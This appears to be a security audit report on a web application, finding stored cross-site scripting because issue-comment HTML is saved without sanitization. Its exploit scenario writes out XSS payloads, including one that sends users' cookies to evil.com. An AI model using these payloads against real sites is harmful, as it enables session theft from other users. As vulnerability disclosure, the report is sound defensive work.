## Findings

### **Vulnerability 1: Missing HTML Sanitization on IssueComment (Create & Update)**

**Severity: High**

For issue **descriptions**, the code correctly sanitizes HTML through `validate_html_content()` (which uses `nh3`) in:
- `IssueSerializer.validate()` (line 93 in `issue.py` serializers)
- `IssueCreateSerializer.validate()` (line 289 in `space/serializer/issue.py`)
- `ProjectSerializer`, `WorkspaceSerializer`, `PageSerializer`, `DraftSerializer`, `StickySerializer`

However, for **comments** (`IssueComment`), **none** of the serializers call `validate_html_content()`:

1. **`IssueCommentCreateSerializer`** (api) — No `validate` method at all. It accepts `comment_html` raw.
2. **`IssueCommentSerializer`** (api) — `validate()` at line 560 only parses/re-serializes HTML via `lxml.html.fromstring` + `html.tostring`. This does NOT sanitize dangerous content (scripts, event handlers, etc.). `lxml`'s `html.fromstring` will parse script tags and re-serialize them if they're valid HTML.
3. **`IssueCommentSerializer`** (app) — No `validate` method at all.
4. **`IssueCommentSerializer`** (space) — No `validate` method at all.
5. The model's `save()` method only produces `comment_stripped` (plain text) but stores raw `comment_html` unchanged.

The lxml parsing step in the api `IssueCommentSerializer` is insufficient — it only validates that the input is well-formed HTML, but does **not** remove `<script>`, `<iframe>`, `onclick`, `javascript:`, or other dangerous HTML/JS content.

### **CWE Classification**
- **CWE-79**: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- **CWE-80**: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)

### **Exploit Scenario**
A project member creates an issue comment containing:
```html
<script>alert(document.cookie)</script>
```
Or:
```html
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```
Or:
```html
<a href="javascript:alert('xss')">click me</a>
```

This HTML is stored verbatim in `comment_html` and rendered in the web UI when other users view the issue, leading to stored XSS.

### **Additional Notes**
- The `description_html` path on issues is **properly protected** by `nh3` sanitization.
- The `comment_html` path is **missing this protection entirely** across all three API surfaces (api, app, space).
- The model-level `strip_tags` only affects the search/plain-text representation, not the stored HTML.
- The `lxml` re-parsing in `IssueCommentSerializer.validate()` for the api module provides only basic well-formedness checking, not security sanitization.

- **No fixes were applied** — the audit was exploratory only (read-only environment).
